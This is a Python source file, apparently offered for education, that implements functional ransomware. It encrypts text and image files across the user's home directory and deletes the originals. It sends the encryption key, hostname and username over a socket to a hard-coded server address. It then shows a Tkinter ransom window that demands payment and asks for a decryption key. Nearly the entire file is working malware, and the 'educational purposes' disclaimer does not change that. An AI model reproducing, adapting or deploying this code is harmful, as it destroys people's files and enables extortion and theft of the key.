# MIT License
# Copyright (c) 2025 Warren Coleman
# 
# This software is provided for educational and research purposes only.
# Unauthorized use of this tool for malicious purposes is illegal.

import socket
import os
import json
import gc
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet

class Encoder:

    def __init__(self, host, port, directory, extensions):
        self.host = host
        self.port = port
        self.directory = directory
        self.extensions = extensions
        self.key = Fernet.generate_key()

    def encrypt_file(self, file_path):
        f = Fernet(self.key)
        with open(file_path, "rb") as file:
            original = file.read()
        encrypted_data = f.encrypt(original)

        encrypted_path = file_path + ".simcrypt"
        with open(encrypted_path, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

        os.remove(file_path)
        return encrypted_path

    def get_username(self):
        try:
            username = os.getlogin()
            return username
        except:
            return "Could not retrieve user"

    def find_files(self):
        encrypted_files = []
        for root, _, files in os.walk(self.directory):
            for filename in files:
                file_path = os.path.join(root, filename)
                if os.path.isfile(file_path) and file_path.endswith(tuple(self.extensions)):
                    encrypted_file_path = self.encrypt_file(file_path)
                    encrypted_files.append(encrypted_file_path)
        return encrypted_files
    
    def get_data(self):
        return {
            'device_name': socket.gethostname(),
            'key': self.key.decode(),
            'username': self.get_username()
        }
    
    def send_data(self):
        data = self.get_data()
        self.send_to_server(json.dumps(data))
                
    def send_to_server(self, data):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.host, self.port))
                s.sendall(data.encode())
        except:
            quit(0)

    def clear_memory(self):
        gc.collect()

class Decoder:

    def __init__(self, host, port, directory):
        self.host = host
        self.port = port
        self.directory = directory

    def decrypt_file(self, file_path, key):
        try:
            f = Fernet(key)
            with open(file_path, 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
           
            original_file_path = file_path.replace(".simcrypt", "")
            with open(original_file_path, 'wb') as file:
                file.write(decrypted_data)

            os.remove(file_path)

        except Exception as e:
            print(f"Could not decrypt {file_path}: {e}")

    def find_and_decrypt(self, key):
        for root, _, files in os.walk(self.directory):
            for file in files:
                if file.endswith(".simcrypt"):
                    file_path = os.path.join(root, file)
                    self.decrypt_file(file_path, key)

    def request_key(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.host, self.port))
            s.sendall(json.dumps({'request': 'key'}).encode())
            data = s.recv(1024)
            response = json.loads(data.decode())
            return response.get('key')
        
    def clear_memory(self):
        gc.collect()

class PopUp:

    def __init__(self, decoder):
        self.decoder = decoder
        self.root = tk.Tk()
        self.root.title("You have been Hacked. Pay to save your files.")
        self.root.geometry("400x200")


        self.label = tk.Label(self.root, text="Enter your decryption key:")
        self.label.pack(pady=10)

        self.entry = tk.Entry(self.root, width=50)
        self.entry.pack(pady=10)

        self.decrypt_button = tk.Button(self.root, text="Decrypt", command=self.process_input)
        self.decrypt_button.pack(pady=10)

    def process_input(self):
        key = self.entry.get()
        if key:
            try:
                key_bytes = key.encode()
                self.decoder.find_and_decrypt(key_bytes)
                messagebox.showinfo("Success", "Thank you for your business!")
                self.root.destroy()
            except Exception as e:
                messagebox.showerror("Error", f"Decryption failed: {e}")
        else:
            messagebox.showwarning("Input needed", "Please enter a decryption key")

def main():
    host = '192.168.42.130' #Change to the server's IP
    extensions = ['.txt', '.png', '.jpeg']
    port = 9672 #Change to the port the server is listening on
    directory = 'c:/Users/' + os.getlogin()

    test_encode = Encoder(host, port, directory, extensions)
    test_encode.find_files()
    test_encode.send_data()
    test_encode.clear_memory()

    try:
        decoder = Decoder(host, port, directory)
        pop_up = PopUp(decoder)
        pop_up.root.mainloop()
    except Exception as e:
        print(f"Some error occured: {e}")

    decoder.clear_memory()

if __name__ == "__main__":
    main()
